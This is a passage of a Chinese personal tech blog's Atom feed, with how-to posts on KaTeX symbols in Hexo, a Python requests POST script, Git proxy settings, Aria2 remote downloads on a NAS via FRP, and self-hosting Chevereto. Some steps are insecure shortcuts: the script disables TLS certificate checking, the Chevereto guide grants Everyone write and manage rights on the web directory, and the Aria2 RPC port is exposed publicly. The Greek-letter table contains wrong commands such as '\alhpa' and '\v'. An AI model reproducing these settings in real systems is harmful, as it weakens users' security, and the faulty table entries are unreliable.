class="mrel">→</span></span></span></span>。<br />  右箭头，符号：<code>\Rightarrow</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⇒</mo></mrow><annotation encoding="application/x-tex">\Rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">⇒</span></span></span></span>。</p><p>  底端对齐的省略号，符号：<code>\ldots</code>，如：<code>1,2,\ldots,n</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>1</mn><mo separator="true">,</mo><mn>2</mn><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">1,2,\ldots,n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8388800000000001em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">n</span></span></span></span>。<br />  中线对齐的省略号，符号：<code>\cdots</code>，如：<code>x_1^2 + x_2^2 + \cdots + x_n^2</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mi>x</mi><mn>1</mn><mn>2</mn></msubsup><mo>+</mo><msubsup><mi>x</mi><mn>2</mn><mn>2</mn></msubsup><mo>+</mo><mo>⋯</mo><mo>+</mo><msubsup><mi>x</mi><mi>n</mi><mn>2</mn></msubsup></mrow><annotation encoding="application/x-tex">x_1^2 + x_2^2 + \cdots + x_n^2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0622159999999998em;vertical-align:-0.24810799999999997em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4518920000000004em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24810799999999997em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="minner">⋯</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.061108em;vertical-align:-0.247em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-2.4530000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">n</span></span></span><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.247em;"><span></span></span></span></span></span></span></span></span></span>。<br />  竖直对齐的省略号，符号：<code>\vdots</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">⋮</mi><mpadded height="+0em" voffset="0em"><mspace mathbackground="black" width="0em" height="1.5em"></mspace></mpadded></mrow><annotation encoding="application/x-tex">\vdots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.53em;vertical-align:-0.03em;"></span><span class="mord"><span class="mord">⋮</span><span class="mord rule" style="border-right-width:0em;border-top-width:1.5em;bottom:0em;"></span></span></span></span></span>。<br />  斜对齐的省略号，符号：<code>\ddots</code>，如：<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>⋱</mo></mrow><annotation encoding="application/x-tex">\ddots</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.82em;vertical-align:0em;"></span><span class="minner">⋱</span></span></span></span>。</p><h2 id="希腊字母"><a class="markdownIt-Anchor" href="#希腊字母"></a> 希腊字母</h2><table><thead><tr><th>字母</th><th>实现</th><th>字母</th><th>实现</th></tr></thead><tbody><tr><td>A</td><td>A</td><td>α</td><td>\alhpa</td></tr><tr><td>B</td><td>B</td><td>β</td><td>\beta</td></tr><tr><td>Γ</td><td>\Gamma</td><td>γ</td><td>\gamma</td></tr><tr><td>Δ</td><td>\Delta</td><td>δ</td><td>\delta</td></tr><tr><td>E</td><td>E</td><td>ϵ</td><td>\epsilon</td></tr><tr><td>Z</td><td>Z</td><td>ζ</td><td>\zeta</td></tr><tr><td>H</td><td>H</td><td>η</td><td>\eta</td></tr><tr><td>Θ</td><td>\Theta</td><td>θ</td><td>\theta</td></tr><tr><td>I</td><td>I</td><td>ι</td><td>\iota</td></tr><tr><td>K</td><td>K</td><td>κ</td><td>\kappa</td></tr><tr><td>Λ</td><td>\Lambda</td><td>λ</td><td>\lambda</td></tr><tr><td>M</td><td>M</td><td>μ</td><td>\mu</td></tr><tr><td>N</td><td>N</td><td>ν</td><td>\nu</td></tr><tr><td>Ξ</td><td>\Xi</td><td>ξ</td><td>\xi</td></tr><tr><td>O</td><td>O</td><td>ο</td><td>\omicron</td></tr><tr><td>Π</td><td>\Pi</td><td>π</td><td>\pi</td></tr><tr><td>P</td><td>P</td><td>ρ</td><td>\rho</td></tr><tr><td>Σ</td><td>\Sigma</td><td>σ</td><td>\sigma</td></tr><tr><td>T</td><td>T</td><td>τ</td><td>\tau</td></tr><tr><td>Υ</td><td>\Upsilon</td><td>υ</td><td>\upsilon</td></tr><tr><td>Φ</td><td>\Phi</td><td>ϕ</td><td>\phi</td></tr><tr><td>X</td><td>X</td><td>χ</td><td>\chi</td></tr><tr><td>Ψ</td><td>\Psi</td><td>ψ</td><td>\psi</td></tr><tr><td>Ω</td><td>\v</td><td>ω</td><td>\omega</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;公式包裹方式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#公式包裹方式&quot;&gt;&lt;/a&gt; 公式包裹方式&lt;/h1&gt;
&lt;p&gt;  有两种方式来包裹公式内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;行内公式&lt;br /&gt;
  用&lt;code&gt;$&lt;/code&gt;包裹公</summary>
      
    
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/categories/Hexo/"/>
    
    
    <category term="Github" scheme="https://coder.lufer.cc/tags/Github/"/>
    
    <category term="Hexo" scheme="https://coder.lufer.cc/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Python利用requests库发送带参数的POST请求</title>
    <link href="https://coder.lufer.cc/Python/Python%E5%88%A9%E7%94%A8requests%E5%BA%93%E5%8F%91%E9%80%81%E5%B8%A6%E5%8F%82%E6%95%B0%E7%9A%84POST%E8%AF%B7%E6%B1%82/"/>
    <id>https://coder.lufer.cc/Python/Python%E5%88%A9%E7%94%A8requests%E5%BA%93%E5%8F%91%E9%80%81%E5%B8%A6%E5%8F%82%E6%95%B0%E7%9A%84POST%E8%AF%B7%E6%B1%82/</id>
    <published>2021-04-09T04:11:39.000Z</published>
    <updated>2021-04-20T08:32:44.251Z</updated>
    
    <content type="html"><![CDATA[<p>近日用了requests库写了下脚本，记录一下以备后用。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="comment">#设置请求URL</span></span><br><span class="line">url = <span class="string">&#x27;https://10.200.4.180/api/web/incident/search&#x27;</span></span><br><span class="line"><span class="comment">#设置cookie变量</span></span><br><span class="line">cookie = <span class="string">&#x27;blablabla&#x27;</span></span><br><span class="line"><span class="comment">#设置请求头，主要确认其中的Host，Origin和Referer</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;keep-alive&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate, br&#x27;</span>,</span><br><span class="line">           <span class="comment">#cookie中如果有中文会报&#x27;latin-1&#x27;错误，可以先转义</span></span><br><span class="line">           <span class="string">&#x27;Cookie&#x27;</span>: cookie.encode(<span class="string">&quot;utf-8&quot;</span>).decode(<span class="string">&quot;latin1&quot;</span>),</span><br><span class="line">           <span class="string">&#x27;Origin&#x27;</span>: <span class="string">&#x27;https://10.200.4.180&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://10.200.4.180/hosts&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json; charset=UTF-8&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">           <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span></span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">data = <span class="string">&#x27;datacontent&#x27;</span></span><br><span class="line"><span class="comment">#如果需要转换为json发送，使用json.loads()</span></span><br><span class="line"><span class="comment">#data=json.loads(data)</span></span><br><span class="line"><span class="comment">#如果访问不受信任的网站，需要添加verify=false，否则会报错</span></span><br><span class="line">response = requests.post(url, data=data, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="comment">#返回结果在response.text，可以用json.loads转为json</span></span><br><span class="line">res = json.loads(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;近日用了requests库写了下脚本，记录一下以备后用。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keywor</summary>
      
    
    
    
    <category term="Python" scheme="https://coder.lufer.cc/categories/Python/"/>
    
    
    <category term="Python" scheme="https://coder.lufer.cc/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Github Desktop配置代理</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/GithubDesktop%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/GithubDesktop%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86/</id>
    <published>2021-04-09T04:08:58.000Z</published>
    <updated>2021-04-20T08:32:44.255Z</updated>
    
    <content type="html"><![CDATA[<p>随手记一下，省的以后还要到处找</p><p>打开<code>C:\users\username\.gitconfig</code>文件，最后加上</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[http]</span><br><span class="line">    proxy &#x3D; socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">[https]</span><br><span class="line">    proxy &#x3D; socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br><span class="line">[git]</span><br><span class="line">    proxy &#x3D; socks5:&#x2F;&#x2F;127.0.0.1:1080</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;随手记一下，省的以后还要到处找&lt;/p&gt;
&lt;p&gt;打开&lt;code&gt;C:\users\username\.gitconfig&lt;/code&gt;文件，最后加上&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;</summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
  </entry>
  
  <entry>
    <title>按目录存储Hexo文章并修改生成的链接</title>
    <link href="https://coder.lufer.cc/Hexo/%E6%8C%89%E7%9B%AE%E5%BD%95%E5%AD%98%E5%82%A8Hexo%E6%96%87%E7%AB%A0%E5%B9%B6%E4%BF%AE%E6%94%B9%E7%94%9F%E6%88%90%E7%9A%84%E9%93%BE%E6%8E%A5/"/>
    <id>https://coder.lufer.cc/Hexo/%E6%8C%89%E7%9B%AE%E5%BD%95%E5%AD%98%E5%82%A8Hexo%E6%96%87%E7%AB%A0%E5%B9%B6%E4%BF%AE%E6%94%B9%E7%94%9F%E6%88%90%E7%9A%84%E9%93%BE%E6%8E%A5/</id>
    <published>2021-04-06T03:59:30.000Z</published>
    <updated>2021-04-20T08:32:44.251Z</updated>
    
    <content type="html"><![CDATA[<p>  随着Hexo文章逐渐变多，都放在source文件夹下的话想找某篇文章进行管理就显得有些痛苦了，所以这次我打算建立一些文件夹按照不同类别来管理文章。</p><p>  只需要在<code>_posts</code>下面建立对应的文件夹然后把md文件放进去就可以了。</p><p>  但是这样生成的页面地址会是<code>域名/年/月/日/目录/文章名</code>。这种链接太长了，而且我也不喜欢按照年月日来生成链接。</p><p>  修改<code>_config.yml</code>中的<code>permalink</code>。</p><p>  <code>permalink</code>设定的是生成的链接的格式，默认如下：</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">:year/:month/:day/:title/</span></span><br></pre></td></tr></table></figure><p>  也就是按照<code>/年/月/日/文章名</code>的方式来生成，而文章名在我们设置了文件夹后将会包含/目录/文章名。删掉年月日即可只用目录来管理链接。</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">permalink:</span> <span class="string">:title/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  随着Hexo文章逐渐变多，都放在source文件夹下的话想找某篇文章进行管理就显得有些痛苦了，所以这次我打算建立一些文件夹按照不同类别来管理文章。&lt;/p&gt;
&lt;p&gt;  只需要在&lt;code&gt;_posts&lt;/code&gt;下面建立对应的文件夹然后把md文件放进去就可以了。&lt;/p&gt;</summary>
      
    
    
    
    <category term="Hexo" scheme="https://coder.lufer.cc/categories/Hexo/"/>
    
    
    <category term="Github" scheme="https://coder.lufer.cc/tags/Github/"/>
    
    <category term="Hexo" scheme="https://coder.lufer.cc/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>借助Aria2和Chrome插件实现NAS远程一键下载</title>
    <link href="https://coder.lufer.cc/NAS/%E5%80%9F%E5%8A%A9Aria2%E5%92%8CChrome%E6%8F%92%E4%BB%B6%E5%AE%9E%E7%8E%B0NAS%E8%BF%9C%E7%A8%8B%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BD/"/>
    <id>https://coder.lufer.cc/NAS/%E5%80%9F%E5%8A%A9Aria2%E5%92%8CChrome%E6%8F%92%E4%BB%B6%E5%AE%9E%E7%8E%B0NAS%E8%BF%9C%E7%A8%8B%E4%B8%80%E9%94%AE%E4%B8%8B%E8%BD%BD/</id>
    <published>2021-04-06T01:52:44.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<h1 id="docker安装aria2"><a class="markdownIt-Anchor" href="#docker安装aria2"></a> Docker安装Aria2</h1><p>  选择<code>aria2-with-webui</code>。</p><p><img src="https://pic.lufer.cc/images/2021/04/06/image.png" alt="aria2-with-webui" /></p><p>  将要存放下载文件的路径映射到<code>data</code>目录，并准备文件夹映射到<code>conf</code>目录。</p><p><img src="https://pic.lufer.cc/images/2021/04/06/image7f0411d8a13fce84.png" alt="卷映射" /></p><p>  自定义<code>80</code>和<code>8080</code>对应的本地端口。</p><p><img src="https://pic.lufer.cc/images/2021/04/06/image1f514ee89f06b09e.png" alt="修改端口" /></p><p>  在环境变量中添加一个<code>rpc-secret</code>，自定义令牌密码。</p><p><img src="https://pic.lufer.cc/images/2021/04/06/imagea1c5a07d88e1da48.png" alt="自定义令牌密码" /></p><p>  然后启动容器。</p><h1 id="frp穿透"><a class="markdownIt-Anchor" href="#frp穿透"></a> FRP穿透</h1><p>  修改frpc.ini，把之前设置的80对应的本地端口以及6800端口映射出去。<br />  我之前设置的是7001对应80端口，所以穿透7001，便于网络访问。<br />  把6800端口穿透出去才能够远程创建下载任务。</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[lufer_aria]</span></span><br><span class="line"><span class="attr">type</span>=http</span><br><span class="line"><span class="attr">local_ip</span>=<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span>=<span class="number">7001</span></span><br><span class="line"><span class="attr">custom_domains</span>= 你的域名</span><br><span class="line"></span><br><span class="line"><span class="section">[lufer_ariarpc]</span></span><br><span class="line"><span class="attr">type</span>=tcp</span><br><span class="line"><span class="attr">local_ip</span>=<span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span>=<span class="number">6800</span></span><br><span class="line"><span class="attr">remote_port</span>=<span class="number">6800</span></span><br><span class="line"><span class="attr">custom_domains</span>= 你的域名</span><br></pre></td></tr></table></figure><p>  设置好后重启frp容器。</p><h1 id="chrome插件"><a class="markdownIt-Anchor" href="#chrome插件"></a> Chrome插件</h1><p>  Chrome安装插件<code>Aria2 for Chrome</code>。</p><p>  <a href="https://chrome.google.com/webstore/detail/aria2-for-chrome/mpkodccbngfoacfalldjimigbofkhgjn">https://chrome.google.com/webstore/detail/aria2-for-chrome/mpkodccbngfoacfalldjimigbofkhgjn</a></p><p>  装好之后打开设置页面。</p><p>  把下载拦截的第一项关掉，否则所有任务都会发送到NAS上。</p><p>  RPC Server处设置好令牌密码和rpc地址，点击保存即可。</p><p><img src="https://pic.lufer.cc/images/2021/04/06/image9a46db3243c2a71a.png" alt="插件设置" /></p><h1 id="网页端设置"><a class="markdownIt-Anchor" href="#网页端设置"></a> 网页端设置</h1><p>  访问穿透出去的域名，打开aria2的管理页面。<br />  打开<code>设置</code>-<code>连接设置</code>。</p><p><img src="https://pic.lufer.cc/images/2021/04/06/image61ca82970fb51152.png" alt="连接设置" /></p><p>  主机和RPC路径应该都是自动填好的，只需要设置好密码令牌即可。</p><p><img src="https://pic.lufer.cc/images/2021/04/06/image65d6514f44bf554b.png" alt="设置密码令牌" /></p><p>  保存即可完成配置，右侧会提示连接成功。</p><p><img src="https://pic.lufer.cc/images/2021/04/06/image68bf77b1d4f6b27c.png" alt="配置成功提示" /></p><h1 id="使用"><a class="markdownIt-Anchor" href="#使用"></a> 使用</h1><p>  在需要下载到NAS的链接上点击右键，选择<code>导出到ARIA2 RPC</code>即可。</p><p><img src="https://pic.lufer.cc/images/2021/04/06/image56c461c9d5fd48d6.png" alt="一键远程下载" /></p><p>  如果需要下载磁力或种子，可打开管理页面，手动添加。</p><p><img src="https://pic.lufer.cc/images/2021/04/06/imagedf3b0adde1f3e8c7.png" alt="下载磁链或种子" /></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;docker安装aria2&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#docker安装aria2&quot;&gt;&lt;/a&gt; Docker安装Aria2&lt;/h1&gt;
&lt;p&gt;  选择&lt;code&gt;aria2-with-webui&lt;/code&gt;。&lt;/p&gt;
</summary>
      
    
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/categories/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    
    <category term="日常折腾" scheme="https://coder.lufer.cc/tags/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/"/>
    
    <category term="NAS" scheme="https://coder.lufer.cc/tags/NAS/"/>
    
  </entry>
  
  <entry>
    <title>自建Chevereto图床并设置邀请码注册</title>
    <link href="https://coder.lufer.cc/NAS/%E8%87%AA%E5%BB%BAChevereto%E5%9B%BE%E5%BA%8A%E5%B9%B6%E8%AE%BE%E7%BD%AE%E9%82%80%E8%AF%B7%E7%A0%81%E6%B3%A8%E5%86%8C/"/>
    <id>https://coder.lufer.cc/NAS/%E8%87%AA%E5%BB%BAChevereto%E5%9B%BE%E5%BA%8A%E5%B9%B6%E8%AE%BE%E7%BD%AE%E9%82%80%E8%AF%B7%E7%A0%81%E6%B3%A8%E5%86%8C/</id>
    <published>2021-03-05T08:23:24.000Z</published>
    <updated>2021-12-17T03:59:35.254Z</updated>
    
    <content type="html"><![CDATA[<p>  之前一直在用<code>imgchr.com</code>的图床，但是近期发现无法上传图片，访问倒是正常。</p><p>  为了防止这个图床哪天崩了，决定还是把图放在自己手里比较安全。</p><p>  搜了一圈发现imgchr就是用chevereto搭建的，chevereto是一个开源的免费软件，那不如自己搭一个，正好搭在自己的NAS上，做个穿透即可。</p><h1 id="群晖安装chevereto"><a class="markdownIt-Anchor" href="#群晖安装chevereto"></a> 群晖安装Chevereto</h1><p>  这里才用了什么值得买上<code>zhouningyi01</code>的教程，链接如下。但是有些许不同。</p><p>  <a href="https://post.smzdm.com/p/a3gvxnon/">https://post.smzdm.com/p/a3gvxnon/</a></p><h2 id="下载chevereto代码"><a class="markdownIt-Anchor" href="#下载chevereto代码"></a> 下载Chevereto代码</h2><p>  <code>https://github.com/Chevereto/Chevereto-Free</code></p><p>  选择<code>Download ZIP</code></p><h2 id="群晖安装环境"><a class="markdownIt-Anchor" href="#群晖安装环境"></a> 群晖安装环境</h2><p>  在群晖的套件中心添加图中的套件，其中PHP7.2不需要手动安装，在装其他套件时会提示安装。</p><p><img src="https://pic.lufer.cc/images/2021/03/18/image.png" alt="需要安装的套件" /></p><p>  打开群晖的 Web Station 套件，点击 PHP 设置，如果有就点编辑，如果没有条目就点击新增，然后选择PHP7.2，将下方的扩展名全部打勾，然后确定保存。</p><p><img src="https://pic.lufer.cc/images/2021/03/18/imagedf94afbd0485e69b.png" alt="PHP设置" /></p><p>  把下载的Chevereto压缩包上传到NAS的web目录下并解压</p><p><img src="https://pic.lufer.cc/images/2021/03/18/image845322cb34e029fb.png" alt="压缩包位置" /></p><p>  给Chevereto文件夹权限，<code>右键</code>-<code>属性</code>-<code>权限</code>，然后<code>新增</code>，用户组选 Everyone，并给与<code>管理</code>、<code>读取</code>、写入权限，然后勾上<code>应用到这个文件夹、子文件夹及文件</code>后保存。</p><p><img src="https://pic.lufer.cc/images/2021/03/18/imagee8df02581df4b562.png" alt="设置文件夹权限" /></p><p>  打开群晖的phpMyAdmin，新建一个数据库，数据库名称可以自定义。</p><p><img src="https://pic.lufer.cc/images/2021/03/18/imagea673e78b93413800.png" alt="新建数据库" /></p><p>  打开 Web Station 设置虚拟主机，根据需要选择基于名称或基于端口，因为我需要做内网穿透和HTTPS，所以选择了基于名称，这样在勾选HSTS后可以自动进行HTTP到HTTPS的跳转。如果没有这种需求可以选择基于端口。文档根目录选择到chevereto的目录，并选择对应的后端服务器和PHP版本。</p><p><img src="https://pic.lufer.cc/images/2021/03/18/image5288464eb709dbca.png" alt="虚拟主机设置" /></p><p>  新建一个文本文档，将 “新建文本文档.txt” 重命名为”settings.php“之后传到 web/chevereto/app 文件夹下，缺少这一步的话打开网站会提示：Chevereto can’t create the app/settings.php file. You must manually create this file。</p><p>  打开群晖IP地址：端口号打开管理页面然后填入数据库信息开始安装。</p><p><img src="https://pic.lufer.cc/images/2021/03/18/imagecb5982205d6cd52b.png" alt="数据库设置页面" /></p><p><img src="https://pic.lufer.cc/images/2021/03/18/imagefd8aef9aa9183daa.png" alt="账号设置页面" /></p><p>  最后一项如果选择personal则只能自己使用，如果选择community则允许其他用户注册。</p><p>  至此安装完成。</p><h1 id="添加邀请码注册"><a class="markdownIt-Anchor" href="#添加邀请码注册"></a> 添加邀请码注册</h1><p>  修改 route.signup.php 文件，位置：<code>/chevereto/app/routes/route.signup.php</code>，找到下述代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Input validations</span></span><br><span class="line"><span class="keyword">if</span> (!filter_var(<span class="variable">$_POST</span>[<span class="string">&#x27;email&#x27;</span>], FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">    <span class="variable">$input_errors</span>[<span class="string">&#x27;email&#x27;</span>] = _s(<span class="string">&#x27;Invalid email&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!CHV\User::isValidUsername(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input_errors</span>[<span class="string">&#x27;username&#x27;</span>] = _s(<span class="string">&#x27;Invalid username&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/&#x27;</span> . CHV\getSetting(<span class="string">&#x27;user_password_pattern&#x27;</span>) . <span class="string">&#x27;/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$input_errors</span>[<span class="string">&#x27;password&#x27;</span>] = _s(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  之后追加：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//邀请码</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;invitationcode&#x27;</span>]) || <span class="variable">$_POST</span>[<span class="string">&#x27;invitationcode&#x27;</span>] != <span class="string">&#x27;你要设置的邀请码&#x27;</span>) &#123;</span><br><span class="line">    <span class="variable">$input_errors</span>[<span class="string">&#x27;invitationcode&#x27;</span>] = _s(<span class="string">&#x27;Invalid invitation code&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  修改signup.php 文件，位置：<code>/chevereto/app/themes/Peafowl/views/signup.php</code>，找到 form 表单：</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line">&lt;form class=&quot;content-section&quot; method=&quot;post&quot; autocomplete=&quot;off&quot; data-action=&quot;validate&quot;&gt;</span><br></pre></td></tr></table></figure><p>  添加下述代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;div class=&quot;position-relative&quot;&gt;</span><br><span class="line">    &lt;input name=&quot;invitationcode&quot; tabindex=&quot;1&quot; autocomplete=&quot;off&quot; autocorrect=&quot;off&quot; autocapitalize=&quot;off&quot; type=&quot;input&quot; placeholder=&quot;&lt;?php _se(&#x27;Invitation code&#x27;); ?&gt;&quot; class=&quot;input animate&quot; required value=&quot;&lt;?php echo get_safe_post()[&#x27;invitationcode&#x27;]; ?&gt;&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;text-align-left red-warning&quot;&gt;&lt;?php echo get_input_errors()[&#x27;invitationcode&#x27;]; ?&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  之前一直在用&lt;code&gt;imgchr.com&lt;/code&gt;的图床，但是近期发现无法上传图片，访问倒是正常。&lt;/p&gt;
&lt;p&gt;  为了防止这个图床哪天崩了，决定还是把图放在自己手里比较安全。&lt;/p&gt;
